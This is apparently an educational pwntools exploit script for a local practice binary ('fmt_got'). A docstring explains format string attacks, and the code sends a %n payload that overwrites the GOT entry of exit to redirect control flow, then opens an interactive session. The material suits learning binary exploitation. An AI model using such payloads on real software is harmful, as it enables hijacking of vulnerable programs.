#!/usr/bin/env python3

"""
Format string Expoits:
                    
                    Format strings can be used to read values from the stack,write values to the stack as well as other places(i.e. GOT table).

Stack:      No canary found
NX:         NX enabled
PIE:        No PIE 
ASLR:       Enabled

    Format strings can be exploited to write any value to any writeable address of the program using the %n format specifier. 
Knowing this, we can overwrite the address of any function inside the GOT(Global Offset Table) and replace it with the address
of some other funtion. Whatever string we provide to the format function(i.e. printf) goes to the stack, so first we need to 
know where in the stack is our string. We can do so with the help of stack_leak.py and find out where are the A's(4141414141414141)
on the stack. Then we can write the address of the address of GOT of the function we want to overwrite along with the %<i>$n where i
is the 8byte location on the stack where our string is being written. Because %n writes, in the  provided address, the count of characters 
already written, we can use %<n>x to append the string to any value.

    Here, i is 6 but because we are writing 16 bytes before the address, i becomes 8 and n is 4198838 which is the address of the funtion we want
to overwrite GOT entry of exit with and elf.got.exit will give us the address of GOT table entry of exit where we want to write the new address.
"""

from pwn import *

bin = context.binary = ELF("./fmt_got")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        context.terminal = ["gnome-terminal", "--"]
        return gdb.debug([bin.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([bin.path] + argv, *a, **kw)


gdbscript = """
b main
continue
""".format(
    **locals()
)

io = start()

payload = b""

payload += b"%4198838x%8$nAAA"

payload += pack(bin.got.exit)

io.sendline(payload)

io.interactive()
